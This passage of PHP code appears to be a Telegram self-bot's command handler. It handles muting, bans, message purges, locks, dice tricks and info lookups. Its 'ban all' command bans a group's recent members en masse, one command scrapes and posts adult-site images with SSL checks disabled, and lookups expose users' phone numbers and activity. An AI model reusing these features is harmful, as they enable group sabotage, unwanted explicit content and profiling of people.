'id' => $message_id,
'parse_mode'      => "HTML"
]);
}


if (preg_match('/^[\#\!\.\/]?(muteR)$/i', $msgOrig)) {
if ($type != 'user' && $type != 'bot') {
if (isset($replyToId)) {
if ($type == 'channel' || $type == 'supergroup') {
    $rpf = yield $this->channels->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
} else {
    $rpf = yield $this->messages->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
}
$rpfi = $rpf['id'];
$rpfn = $rpf['first_name'];
$alert = "<b>This User </b><a href='mention:$rpfi'>$rpfn</a><b> Successfully Muted V:2.0.0</b>";
yield $this->messages->editMessage([
    'peer'=> $chat_id,
    'message'         => $alert,
    'id' => $message_id,
    'parse_mode'      => "HTML"
]);
array_push($data['Mutes'], $rpfi);
    yield put("data/data.json", json_encode($data));
} else {
yield $this->messages->editMessage([
    'peer'=> $chat_id,
    'message'         => '<b>Please Reply.</b>',
'id' => $message_id,
    'parse_mode'      => "HTML"
]);
}
}
}
// Mute Pv
if (preg_match('/^[\#\!\.\/]?(muter pv)$/i', $msgOrig)) {
if ($type != 'channel' && $type != 'supergroup') {
$g = yield $this->getInfo($chat_id);
$name = $g['User']['first_name'];
yield $this->messages->editMessage([
    'peer'=> $chat_id,
    'message'         =>  "<b>This User </b><a href='mention:$chat_id'>$name</a><b> Successfully Muted.</b>",
    'id'  => $message_id,
    'parse_mode'      => "HTML"
]);
array_push($data['MutePv'], $chat_id);
    yield put("data/data.json", json_encode($data));
}
}
if (preg_match('/^[\#\!\.\/]?(unmuteR pv)$/i', $msgOrig)) {
$g = yield $this->getInfo($chat_id);
$name = $g['User']['first_name'];
$s = array_search($chat_id, $data['MutePv']);
$s = ($s == false) ? 'no' : $s;
if ($s != 'no') {
    yield $this->messages->editMessage([
        'peer'=> $peer,
        'message'         => "<b>This User </b><a href='mention:$chat_id'>$name</a><b> Successfully UnMuted.</b>",
        'id'  => $message_id,
        'parse_mode'      => "HTML"
    ]);
    unset($data['MutePv'][$s]);
        yield put("data/data.json", json_encode($data));
} else {
    yield $this->messages->editMessage([
        'peer'=> $peer,
        'message'         => '<b>Can\'t find this user ...</b>',
        'id'  => $message_id,
        'parse_mode'      => "HTML"
    ]);
}}

 if (preg_match('/^[\#\!\.\/]?(Clean mute list pv)$/i', $msgOrig)) {
$count = count($data['MutePv']) - 1;
if ($count != "") {
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => "<b> All $count Mutes Successfully Cleaned.</b>",
'id'  => $message_id,
'parse_mode'      => "markdown"
]);
$data['MutePv'] = [];
    yield put("data/data.json", json_encode($data));
} else {
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => "<b>MuteList Pv Is Empty :/</b>",
'id'  => $message_id,
'parse_mode'      => "markdown"
]);
}
} 
if (preg_match('/^[\#\!\.\/]?(mute list pv)$/i', $msgOrig)) {
$kos = "**MuteList Pv ** \n\n";
unset($data['MutePv'][0]);
foreach ($data['MutePv'] as $new) {
$kos .= "[$new](mention:$new)" . PHP_EOL;
}
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => "$kos",
'id'  => $message_id,
'parse_mode'      => "markdown"
]);
}
// Unmute Group 
if (preg_match('/^[\#\!\.\/]?(unmuteR)$/i', $msgOrig)) {
if ($type != 'user' && $type != 'bot') {
if (isset($replyToId)) {
if ($type == 'channel' || $type == 'supergroup') {
    $rpf = yield $this->channels->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
} else {
    $rpf = yield $this->messages->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
}
$rpfi = $rpf['id'];
$rpfn = $rpf['first_name'];
$s = array_search($rpfi, $data['Mutes']);
$s = ($s == false) ? 'no' : $s;
if ($s != 'no') {
    $alert = "<b>This User </b><a href='mention:$rpfi'>$rpfn</a><b> Successfully UnMuted V:2.0.0</b>";
    yield $this->messages->editMessage([
        'peer'=> $chat_id,
        'message'         => $alert,
        'id' => $message_id,
        'parse_mode'      => "HTML"
    ]);
    unset($data['Mutes'][$s]);
        yield put("data/data.json", json_encode($data));
} else {
    yield $this->messages->editMessage([
        'peer'=> $chat_id,
        'message'         => '<b>Can\'t find this user ...</b>',
        'id' => $message_id,
        'parse_mode'      => "HTML"
    ]);
}
} else {
yield $this->messages->editMessage([
    'peer'=> $chat_id,
    'message'         => '<b>Please Reply.</b>',
    'id' => $message_id,
    'parse_mode'      => "HTML"
]);
}
}
} if (preg_match('/^[\#\!\.\/]?(Clean mute list)$/i', $msgOrig)) {
$count = count($data['Mutes']) - 1;
if ($count != "") {
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => "<b> All $count Mutes Successfully Cleaned.</b>",
'id'  => $message_id,
'parse_mode'      => "markdown"
]);
$data['Mutes'] = [];
    yield put("data/data.json", json_encode($data));
} else {
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => "<b>MuteList Is Empty :/</b>",
'id'  => $message_id,
'parse_mode'      => "markdown"
]);
}
} if (preg_match('/^[\#\!\.\/]?(mute list)$/i', $msgOrig)) {
$kos = "**Mute List ** \n\n";
unset($data['Mutes'][0]);
foreach ($data['Mutes'] as $new) {
$kos .= "[$new](mention:$new)" . PHP_EOL;
}
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => "$kos",
'id'  => $message_id,
'parse_mode'      => "markdown"
]);
}

if (preg_match('/^[\#\!\.\/]?(vip list)$/i', $msgOrig)) {
$kos = "**Vip List ** \n\n";
foreach ($data['spam'] as $new) {
$kos .= "[$new](mention:$new)" . PHP_EOL;
}
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => "$kos",
'id'  => $message_id,
'parse_mode'      => "markdown"
]);
}

if (preg_match('/^[\/\!\#\!\.]?(set welcome)$/siu', $msgOrig)) {
if (isset($replyToId)) {
if ($type == 'channel' || $type == 'supergroup') {
$message = yield $this->channels->getMessages(['channel' => $chat_id, 'id' => [$replyToId]]);
} else {
$message = yield $this->messages->getMessages(['channel' => $chat_id, 'id' => [$replyToId]]);
}
$media = isset($message['messages'][0]['media']) ? $message['messages'][0]['media'] : 'havent';
$message_text = $message['messages'][0]['message'];
if ($media != 'havent') {
$data['Groups'][$chat_id]['JoinAnswer']['Media'] = ['Media' => $media, 'Text' => $message_text];
if (isset($data['Groups'][$chat_id]['JoinAnswer']['Text'])) {
    unset($data['Groups'][$chat_id]['JoinAnswer']['Text']);
}
yield $this->messages->editMessage([
    'peer'       => $chat_id,
    'message'    => '*Welcome MediaAnswer Set for this group.*',
    'id'         => $message_id,
    'parse_mode' => "markdown"
]);
    yield put("data/data.json", json_encode($data));
} else {
$data['Groups'][$chat_id]['JoinAnswer']['Text'] = $message_text;
if (isset($data['Groups'][$chat_id]['JoinAnswer']['Media'])) {
    unset($data['Groups'][$chat_id]['JoinAnswer']['Media']);
}
yield $this->messages->editMessage([
    'peer'       => $chat_id,
    'message'    => '*Welcome Answer Set for this group.*',
    'id'         => $message_id,
    'parse_mode' => "markdown"
]);
    yield put("data/data.json", json_encode($data));
}
}
} if (preg_match('/[\/\!\#\!\.]?(delete welcome)$/i', $msgOrig)) {
if (isset($data['Groups'][$chat_id]['JoinAnswer'])) {
unset($data['Groups'][$chat_id]['JoinAnswer']);
yield $this->messages->editMessage([
'peer'       => $chat_id,
'id' => $message_id,
'message'    => '`Welcome Note Now is Off For This Group.`',
'parse_mode' => "markdown"
]);
    yield put("data/data.json", json_encode($data));
} else {
yield $this->messages->sendMessage([
'peer'=> $chat_id,
'message'         => "<pre>Erorr : You have not set a welcome message for this group</pre>",
'reply_to_msg_id' => $message_id,
'parse_mode'      => "HTML"
]);
}
}
if (preg_match('/^[\#\!\.\/]?antiflood (.*)$/i', $msgOrig, $tata)) {
$h = "<b>Anti Flood Now Is $tata[1] For This Group</b>";
yield $this->messages->editMessage([
'peer'=> $chat_id,
'id' => $message_id,
'message'         => $h,
'parse_mode'      => "HTML"
]);
$data['antiflood'][$chat_id] = $tata[1];
    yield put("data/data.json", json_encode($data));

}
if (preg_match('/^[\#\!\.\/]?floodlimit (.*)$/i', $msgOrig, $vvv)) {
$h = "<b>Flood Limit Was Set to $vvv[1]</b>";
yield $this->messages->editMessage([
'peer'=> $chat_id,
'id' => $message_id,
'message'         => $h,
'parse_mode'      => "HTML"
]);
$data['flood_limit'] = $vvv[1];
    yield put("data/data.json", json_encode($data));
}


if (preg_match('/^[\/\!\#\.]?(tag admin)$/siu', $msgOrig)) {
if ($type == 'supergroup') {
try {
$channel = $chat_id;
$participants = yield $this->channels->getParticipants([
    'channel' => $channel,
    'filter' => [
        '_' => 'channelParticipantsAdmins'
    ],
    'offset' => 0,
    'limit' => 50,
])['participants'];
$string = '<b> Admins :</b><br />';
$i = 1;
foreach ($participants as $value) {
    if ($value['_'] == 'channelParticipantAdmin') {
        $ID         = $value['user_id'];
        $getname    = yield $this->getInfo($ID)['User']['first_name'];
        //$first_name = fix(isset($value['rank']) ? $value['rank'] : "Admin ($i)");
        $string .= "<br /> ├$i [<a href='mention:$ID'>$ID ↬ $getname</a>]";
        $i++;
    }
}
$string .= '<br /> └— <b> ' . ($i - 1) . ' Admins</b>';
yield $this->messages->sendMessage([
    'peer'=> $chat_id,
    'message'         => "$string",
    'parse_mode'      => "html",
    'reply_to_msg_id' => $message_id
]);
} catch (\Throwable $e) {
yield $this->messages->sendMessage([
    'peer'    => $chat_id,
    'message' => $e->getMessage()
]);
}
} else {
yield $this->messages->sendMessage([
'peer'    => $chat_id,
'message' => 'Only SuperGroups Are Allowed to Use This Option'
]);
}
}

if (preg_match('/^[\#\/\!\.]?(ban all)$/siu', $msgOrig)) {
$channelParticipantsRecent = ['_' => 'channelParticipantsRecent'];
$getresult = yield $this->channels->getParticipants([
'channel' => $chat_id,
'filter'  => $channelParticipantsRecent,
'offset'  => 0,
'limit'   => 100
]);
$users = $getresult['users'];
$ChatBannedRights          = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => -1];
foreach ($users as $new) {
$id = $new['id'];
try {
yield $this->channels->editBanned([
    'channel'       => $chat_id,
    'participant'   => $id,
    'banned_rights' => $ChatBannedRights,
]);
} catch (\Throwable $e) {
echo $e->getMessage();
}
}
}
if (preg_match('/^[\#\/\!\.]?(ban delete)$/siu', $msgOrig)) {
if ($type == 'channel' || $type == 'supergroup') {
$chats = yield $this->getAllDeletes($chat_id);
$ChatBannedRights = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => -1];
$baned = 0;
foreach ($chats as $new) {
$id = $new['id'];
try {
    yield $this->channels->editBanned([
        'channel'       => $chat_id,
        'participant'   => $id,
        'banned_rights' => $ChatBannedRights,
    ]);
    $baned++;
} catch (\Throwable $e) {
    /*yield $this->messages->sendMessage([
        'peer' => $chat_id,
        'message' => $e->getMessage(),
        'parse_mode' => 'Markdown'
    ]); 
    */
}
}
yield $this->messages->sendMessage([
'peer' => $chat_id,
'message' => "**Done : Count Ban **(`$baned`)",
'parse_mode' => 'Markdown'
]);
}
} 

if (preg_match('/^[\/\!\#\.]?xnxx (.*)$/siu', $msgOrig, $xnxx)) {
$query = $xnxx[1];
$ch = curl_init("https://www.xnxx.com/search/$query");
curl_setopt_array($ch, [
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_RETURNTRANSFER => true
]);
$res = curl_exec($ch);
$dom = new DOMDocument();
@$dom->loadHTML($res);
$f = @$dom->getElementsByTagName('img');
$links = [];
foreach ($f as $b) {
$links[] = $b->getAttribute('data-src');
}
unset($links[0]);
foreach ($links as $a) {
yield $this->messages->sendMedia(
[
'peer'    => $chat_id,
'message' => 'Tz',
'media'   => ['_' => 'inputMediaPhotoExternal', 'url' => "$a"]
]
);
//yield $this->sleep(1.5);
}
curl_close($ch);
}

if(isset($update['message']['reply_to']['reply_to_msg_id'])){
if (preg_match('/^[\#\!\.\/]?(pin)$/i', $msgOrig)) {
$Updates = yield $this->messages->updatePinnedMessage(['peer' => $peer, 
'id' =>$replyToId
]);
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "<b>Pinned.</b>",
'parse_mode'      => "markdown"]);
}}

if(isset($update['message']['reply_to']['reply_to_msg_id'])){
if (preg_match('/^[\#\!\.\/]?(unpin)$/i', $msgOrig)) {
yield $this->messages->updatePinnedMessage(['silent' => true,
 'unpin' => true,
 'peer' => $peer, 
 'id' => $replyToId ]);
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "<b>Unpinned.</b>",
'parse_mode'      => "markdown"]);
}}
//==================== Del =====================
if(preg_match('/^[\/\!\#\.]?(Delete) (\d+)$/siu', $msgOrig,$Match)){
yield $this->messages->editMessage(['peer' => $peer,'id' => $message_id,'message' => "`├ • Processing ...!`", 'parse_mode' => 'markdown']);
$Count = 0; $Msgid = $message_id - 1;
do {
if ($type == 'supergroup' or $type == 'channel') {
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$Msgid]]);
$Msgid--; $Count++;
}else {
 yield $this->messages->deleteMessages(['revoke' => 'Bool', 
 'peer'=>$peer,
 'id' => [$Msgid]]);
$Msgid--; $Count++;}
}while($Count != $Match[1]); 
yield $this->messages->editMessage(['peer' => $peer,'id' => $message_id,'message' => "├ • ( `$Count` ) **Message Deleted!**", 'parse_mode' => 'markdown']);}

if(preg_match('/^[\/\!\#\.]?Del (\w+)$/siu', $msgOrig , $Match)){
yield $this->messages->editMessage(['peer' => $peer, 'id' => $message_id, 'message' => "`├ • Processing ...!`", 'parse_mode' => 'MarkDown']);
if(preg_match('/Music|Musics|Video|Videos|File|Files|Photo|Photos|Contact|Contacts|Gif|Gifs|Voice|Voices|Pin|Pins|Url|Urls|RVideo|RVideos|RVoice|RVoices/usi', $Match[1])){
$Req = ['/Music|Musics/usi' , '/Video|Videos/usi' , '/File|Files/usi' , '/Photo|Photos/usi' , '/Contact|Contacts/usi' , '/Gif|Gifs/usi' , '/Voice|Voices/usi' , '/Pin|Pins/usi' , '/Url|Urls/usi' , '/RVideo|RVideos/usi' , '/RVoice|RVoices/usi'];
$Parametr = ['Music' , 'Video' , 'Document' , 'Photos' , 'Contacts' , 'Gif' , 'Voice' , 'Pinned' , 'Url' , 'RoundVideo' , 'RoundVoice'];
$Mode = preg_replace($Req , $Parametr , $Match[1]);
$i = 0;
$Res = yield $this->messages->search(['peer' => $peer, 'q' => '', 'filter' => ['_' => "inputMessagesFilter$Mode"], 'min_date' => -1, 'max_date' => -1, 'offset_id' => $message_id, 'add_offset' => 0, 'limit' => 100, 'max_id' => $message_id, 'min_id' => 0,]);
foreach ($Res['messages'] as $Value){
if ($type == 'supergroup' or $type == 'channel') {
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$Value['id']]]);
$i++;
} else {
yield $this->messages->deleteMessages(['revoke' => 'Bool',
'peer'=>$peer,
 'id' => [$Value['id']]]);
$i++;}}
yield $this->messages->editMessage(['peer' => $peer, 'id' => $message_id, 'message' => "├ • ( `$i` ) **$Mode Messages Deleted On This Chat!**", 'parse_mode' => 'MarkDown']);
}else {
yield $this->messages->editMessage(['peer' => $peer, 'id' => $message_id, 'message' => "**├ • Filter Not Found!**", 
'parse_mode' => 'MarkDown']);}}

if(preg_match('/^[\/\!\#\.]?lock (.*)$/si', $msgOrig,$Match)){

$Lock = $Match[1];
if (!in_array($peer, $data[$Lock])) {
$data[$Lock][] = $peer;
    yield put("data/data.json", json_encode($data));
    yield $this->messages->editMessage(['peer' => $peer, 'id' => $message_id, 'message' => "**├ • The ** ( `$Lock` ) **Was Locked On This Chat!**", 'parse_mode' => 'Markdown']);
    }else{
    yield $this->messages->editMessage(['peer' => $peer, 'id' => $message_id, 'message' => "**├ • The ** ( `$Lock` ) **it was locked!**", 'parse_mode' => 'Markdown']);

}}

if(preg_match('/^[\/\!\#\.]?Unlock (.*)$/si', $msgOrig,$Match)){

$UnLock = $Match[1];
if (in_array($peer, $data[$UnLock])) {
$Key = array_search($peer, $data[$UnLock]);
unset($data[$UnLock][$Key]);
    yield put("data/data.json", json_encode($data));}
yield $this->messages->editMessage(['peer' => $peer, 'id' => $message_id, 'message' => "**├ The ** ( `$UnLock` ) **Was UnLocked On This Chat!**", 'parse_mode' => 'Markdown']);
}

if(preg_match('/^[\#\!\.\/]?(Lockinfo)$/si', $msgOrig)){
yield $this->messages->editMessage(['peer' => $peer,
 'id' => $message_id, 
 'message' => "
├ • ┅┅━━━━ 𖣫 ━━━━┅┅ •
├ • `Pin`
├ • `Gif`
├ • `Via`
├ • `File`
├ • `Poll`
├ • `Link`
├ • `Reply`
├ • `Inline`
├ • `Video`
├ • `Voice`
├ • `Game`
├ • `Photo`
├ • `Music`
├ • `RVideo`
├ • `Sticker`
├ • `Service`
├ • `Contact`
├ • `Mention`
├ • `Forward`
├ • `Location`
├ • `FarsiText`
├ • `LongText`
├ • `Document`
├ • `UserName`
├ • `EnglishText`
├ • `TextMessage`
├ • `AnimatedSticker`
├ • ┅┅━━━━ 𖣫 ━━━━┅┅ •
 ",
  'parse_mode' => 'Markdown']);
}

// SEND DICE
if (preg_match("/^[\/\#\!]?(sd) (.*) (.*)$/i", $msgOrig, $dfdf)) {
$dices = [
'تاس' => "🎲", // 6
'دارت' => "🎯", // 6
'بولینگ' => "🎳", // 6
'توپ'    => "⚽", // 4
'بسکتبال' => "🏀", // 4
'کازینو' => "🎰", // 64
];
$b = ($type == 'supergroup' or $type == 'channel') ? 'channels' : 'messages';
$q = ($type == 'supergroup' or $type == 'channel') ? ['channel' => $chat_id, 'id' => [$message_id]] : ['revoke' => 'Bool',
'peer'=>$chat_id,
'id' => [$message_id]];
yield $this->$b->deleteMessages($q);
if (isset($dices[$dfdf[2]])) {
$dice = $dices[$dfdf[2]];
$num  = $dfdf[3];
while (true) {
$sent = yield $this->messages->sendMedia([
'peer' => $chat_id,
'media' => ['_' => 'inputMediaDice', 'emoticon' => $dice]
]);
$sent_id = isset($sent['updates'][2]['message']['id']) ? $sent['updates'][2]['message']['id']: $sent['updates'][1]['message']['id'];
$sent_dice_value = isset($sent['updates'][2]['message']['media']['value']) ? $sent['updates'][2]['message']['media']['value'] : $sent['updates'][1]['message']['media']['value'];
if ($sent_dice_value != $num) {
$m = ($type == 'supergroup' or $type == 'channel') ? 'channels' : 'messages';
$a = ($type == 'supergroup' or $type == 'channel') ? ['channel' => $chat_id, 'id' => [$sent_id]] : ['revoke' => 'Bool',
'peer'=>$chat_id,
'id' => [$sent_id]];
yield $this->$m->deleteMessages($a);
} else {
break;
}
}
} else {
yield $this->messages->sendMessage([
'peer'            => $chat_id,
'message'         => 'i cant found your dice',
'reply_to_msg_id' => $message_id,
'parse_mode'      => 'markdown'
]);
}
}
if (preg_match('/^[\/\!\#\.]?(instainfo) (.*)$/si', $msgOrig,$Match)){
$t = $Match[2];
$t = str_replace(["@"],"", $t);

$link = file_get_contents("http://haji-api.ir/instainfo?q=$t");
$array=json_decode($link,true);
$fullname=$array['result']['full_name'];
$idd=$fullname=$array['result']['id'];
if ($fullname == "") {
$name = "NoT SeT";
} else {
$name = "$fullname";
}
$username=$array['result']['username'];
$bios=$array['result']['biography'];
if ($bios == "") {
$bio = "NoT SeT";
} else {
$bio = "$bios";
}
$followers=$array['result']['edge_followed_by']['count'];
$following=$array['result']['edge_follow']['count'];
$post=$array['result']['edge_owner_to_timeline_media']['count'];
$photos=$array['result']['profile_pic_url'];
$is_private=$array['result']['is_private'];
if ($is_private == false) {
$pri = "Yes";
} else {
$pri = "No";
}
yield $this->messages->sendMedia(['peer' => $peer, 
'media'=> ['_' => 'inputMediaPhotoExternal', 'url' => "$photos"],
 'message' => 
 "**Paige information OF $t**

├ • `ID `↬ `$idd`
├ • `Name `↬ `$name`
├ • `UserName `↬ `$username`
├ • `Biography `↬ `$bio`
├ • `Post Count `↬ `$post`
├ • `Followers Count `↬ `$followers`
├ • `Following Count `↬ `$following`
├ • `Private Account `↬ `$pri`
├ • `Current ChatID `↬ (`$chat_id`)
├ • `Developer` ↬ @SiNoTz
├ • ┅┅━━━━ 𖣫 ━━━━┅┅ •
",
'parse_mode' => 'markdown'
]);
}

//==================== Actions =====================
if (preg_match('/^[\/\!\#\.]?(Cinfo) (.*)$/si', $msgOrig,$Match)){

$Gpinf = yield $this->getFullInfo($Match[2]);
$title = $Gpinf['Chat']['title'];
$iD = $Gpinf['Chat']['id'];
$uname = $Gpinf['Chat']['username'] ?? "---";
$about = $Gpinf['full']['about'] ?? "---";
$type = $Gpinf['type'];
$CreatTime = date('Y/m/d | H:i:s' , $Gpinf['Chat']['date']);
if ($Gpinf['Chat']['verified'] == 1){ $Verified = "Yes"; } else { $Verified = "No";}
if ($Gpinf['Chat']['scam'] == 1){ $Scam = "Yes"; } else { $Scam = "No";}
$Keyicked = $Gpinf['full']['kicked_count'] ?? "---";
$admin = $Gpinf['full']['admins_count'] ?? "---";
$banned = $Gpinf['full']['banned_count'] ?? "---";
$participants = $Gpinf['full']['participants_count'];
if($Gpinf['Chat']['photo']['_'] !== "chatPhotoEmpty"){
$inputPhoto = ['_' => 'inputPhoto', 'id' => $Gpinf['full']['chat_photo']['id'], 'access_hash' => $Gpinf['full']['chat_photo']['access_hash']];
$inputMediaPhoto = ['_' => 'inputMediaPhoto', 'id' => $inputPhoto];
yield $this->messages->sendMedia(['peer' => $peer, 
'media' => $inputMediaPhoto,
 'message' => "
<br>Chat information OF $title</br>
<strong>
├ •  Chat iD  ↬ (-100$iD)
├ •  Title  ↬ ($title)
├ •  Username  ↬ ($uname)
├ •  Type  ↬ ($type)
├ •  Members Count  ↬ ($participants)
├ •  Admins Count  ↬ ($admin)
├ •  Banned Count  ↬ ($banned)
├ •  Kicked Count  ↬ ($Keyicked)
├ •  Verified By Telegram  ↬ ($Verified)
├ •  Scam  ↬ ($Scam)
├ •  Creat Time  ↬ ($CreatTime)
├ •  Chat About  ↬ ($about)
</strong>
",
'parse_mode' => 'html']);
}else{
yield $this->messages->sendMessage(['peer' => $peer, 
'message' => "
<br>Chat information OF $title</br>
<strong>
├ •  Chat iD  ↬ (-100$iD)
├ •  Title  ↬ ($title)
├ •  Username  ↬ ($uname)
├ •  Type  ↬ ($type)
├ •  Members Count  ↬ ($participants)
├ •  Admins Count  ↬ ($admin)
├ •  Banned Count  ↬ ($banned)
├ •  Kicked Count  ↬ ($Keyicked)
├ •  Verified By Telegram  ↬ ($Verified)
├ •  Scam  ↬ ($Scam)
├ •  Creat Time  ↬ ($CreatTime)
├ •  Chat About  ↬ ($about)
</strong>",
'parse_mode' => 'html']);}
if ($type == 'supergroup' or $type == 'channel') {
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);
} else {
yield $this->messages->deleteMessages(['revoke' => 'Bool', 
'peer'=>$peer,
'id' => [$message_id]]);}}

if (preg_match('/^[\#\!\.\/]?(info) (.*)$/si', $msgOrig, $ar)) {
try {
    $GETFULLINFO       = yield $this->getFullInfo($ar[2]);
    $USER              = $GETFULLINFO['User'];
    $PHONE             = isset($USER['phone'])         ? $USER['phone']     : '--';
    $LASTNAME          = isset($USER['last_name'])     ? $USER['last_name'] : '--';
    $CONTACT           = ($USER['contact']  == false)  ? 'no'               : 'yes';
    $IS_BOT            = ($USER['bot']      == false)  ? 'no'               : 'yes';
    $SCAM              = ($USER['scam']     == false)  ? 'no'               : 'yes';
    $VERIFIED          = ($USER['verified'] == false)  ? 'no'               : 'yes';
    $SUPPORT           = ($USER['support']  == false)  ? 'no'               : 'yes';
    $FULL              = $GETFULLINFO['full'];
    $n = $USER['first_name'];
    $iD= $FULL['id'];
    $bio               = isset($FULL['about'])    ? $FULL['about']          : "Haven't";
    $un= isset($FULL['username']) ? $FULL['username']       : "Haven't";
    $profile           = isset($FULL['profile_photo'])? $FULL['profile_photo']  : 'havent';
    $status            = isset($GETFULLINFO['full']['users'][0]['status']['_'])       ? substr($GETFULLINFO['full']['users'][0]['status']['_'], 10) : '--';
    $last_seen         = isset($GETFULLINFO['full']['users'][0]['status']['was_online']) ? $GETFULLINFO['full']['users'][0]['status']['was_online']       : '--';
    if ($last_seen != '--') {
$last_seen = date('H:i:s', $last_seen);
    }
    $common_chats      = isset($FULL['common_chats_count'])  ? $FULL['common_chats_count']  : '--';
    $IS_BLOCKED        = ($FULL['blocked'] == false) ? 'no' : 'yes';
    $ALLOW_CALLS       = ($FULL['phone_calls_available'] == false) ? 'no' : 'yes';
    $ALLOW_VID_CALLS   = ($FULL['video_calls_available'] == false) ? 'no' : 'yes';
    $photos            = yield $this->photos->getUserPhotos(['user_id' => $iD, 'offset' => 0, 'max_id' => 0, 'limit' => 0]);
    $pic_counts        = isset($photos['photos']) ? count($photos['photos']) : '0';
$inforamtion =
"**User information OF **[$n](mention:$iD)\n
├ • `Name` ↬ (`$n`)
├ • `LastName` ↬ (`$LASTNAME`)
├ • `UserID` ↬ (`$iD`)
├ • `Phone` ↬ (`$PHONE`)
├ • `Your Contact` ↬ (`$CONTACT`)
├ • `Is Bot` ↬ (`$IS_BOT`)
├ • `Scam` ↬ (`$SCAM`)
├ • `Verified` ↬ (`$VERIFIED`)
├ • `Support` ↬ (`$SUPPORT`)
├ • `Blocked` ↬ (`$IS_BLOCKED`)
├ • `Allow Calls` ↬ (`$ALLOW_CALLS`)
├ • `Allow Video Calls` ↬ (`$ALLOW_VID_CALLS`)
├ • `Username` ↬ (`$un`)
├ • `Bio` ↬ (`$bio`)
├ • `Status` ↬ (`$status`)
├ • `LastSeen` ↬ (`$last_seen`)
├ • `Profile Picture` ↬ (`$pic_counts`)
├ • `Common Groups` ↬ (`$common_chats`)
├ • `Current ChatID` ↬ (`$chat_id`)";
    if ($profile == 'havent') {
yield $this->messages->sendMessage([
'peer'            => $chat_id,
'message'         => $inforamtion,
'reply_to_msg_id' => $message_id,
'parse_mode'      => 'markdown'
]);
    } else {
$profile_ID        = $profile['id'];
$profile_hash      = $profile['access_hash'];
$profile_reference = $profile['file_reference'];
$input_photo       = ['_' => "inputPhoto", 'id' => $profile_ID, 'access_hash' => $profile_hash, 'file_reference' => $profile_reference];
$input_media_photo = ['_' => "inputMediaPhoto", 'id' => $input_photo];
yield $this->messages->sendMedia([
'peer'            => $chat_id,
'media'           => $input_media_photo,
'message'         => $inforamtion,
'reply_to_msg_id' => $message_id,
'parse_mode'      => "markdown"
]);
    }
} catch (\Throwable $e) {
    yield $this->messages->sendMessage([
'peer'            => $chat_id,
'message'         => $e->getMessage(),
'reply_to_msg_id' => $message_id,
'parse_mode'      => 'markdown'
    ]);
}
}


if (preg_match('/(\d+?) (.*)/', $msgOrig, $yesh)) {
$num = $yesh[1];
if (strpos($yesh[2], 'زوج') !== false) {
$even = [2, 4, 6];
$x = 0;
while (true) {
for ($i = 1; $i <= $num; $i++) {
$sent= yield $this->messages->sendMedia([
'peer'=> $chat_id,
    'media'=> ['_' => 'inputMediaDice', 'emoticon' => "🎲"]
]);
$sent_id= isset($sent['updates'][2]['message']['id']) ? $sent['updates'][2]['message']['id'] : $sent['updates'][1]['message']['id'];
$sent_dice_value = isset($sent['updates'][2]['message']['media']['value']) ? $sent['updates'][2]['message']['media']['value'] : $sent['updates'][1]['message']['media']['value'];
if (!in_array($sent_dice_value, $even)) {
    $m = ($type == 'supergroup' or $type == 'channel') ? 'channels' : 'messages';
    $a = ($type == 'supergroup' or $type == 'channel') ? ['channel' => $chat_id,
     'id' => [$sent_id]] : ['rovoke' => "Bool", 'id' => [$sent_id]];
    yield $this->$m->deleteMessages($a);
} else {
    $x += 1;
}
}
if ($x == $num) {
$x = 0;
break;
}
}
} elseif (strpos($yesh[1], 'فرد') !== false) {
}
}



if (preg_match('/^[\#\!\.\/]?(join) (on|off)$/si', $msgOrig, $ar)) {
if (preg_match('/on/usi' , $ar[2])){
if (isset($data['Join'][$peer])) {
}else{
$data['Join'][] = $peer;
yield put("data/data.json", json_encode($data));}
yield $this->messages->editMessage(['peer' => $peer, 'id' => $message_id, 'message' => "**├ • Join Mode For This Chat Has Been Actived!**", 'parse_mode' => 'Markdown']);
}else {
if (in_array($peer, $data['Join'])) {
$Key = array_search($peer, $data['Join']);
unset($data['Join'][$Key]);
yield put("data/data.json", json_encode($data));
}
yield $this->messages->editMessage(['peer' => $peer, 'id' => $message_id, 'message' => "**├ • Join Mode For This Chat Has Been DeActived!**", 'parse_mode' => 'Markdown']);}}
//==================== Set Join Mute =====================
if(preg_match('/^[\#\!\.\/]?(SetJoinMute)$/si',$msgOrig)){
$data['JoinMode'] = "Mute";
yield put("data/data.json", json_encode($data));
yield $this->messages->editMessage(['peer' => $peer, 'id' => $message_id, 'message' => "├ • Join Mode Was Set To Mute!", 'parse_mode' => 'MarkDown']);}
//==================== Set Join Ban =====================
if(preg_match('/^[\#\!\.\/]?(SetJoinBan)$/si',$msgOrig)){
$data['JoinMode'] = "Ban";
yield put("data/data.json", json_encode($data));
yield $this->messages->editMessage(['peer' => $peer,'id' => $message_id,'message' => " ├ • Join Mode Was Set To Ban !",'parse_mode'=>'MarkDown']);}
}
// @MrDevTz - @SiNo_Tz
if (in_array($peer, $data['Join'])) {
if (isset($action)) {
        $user = $update['message']['from_id'];
$info2 = yield $this->getInfo($user);
$i = $info2['User']['id'] ?? 'Unknown User';
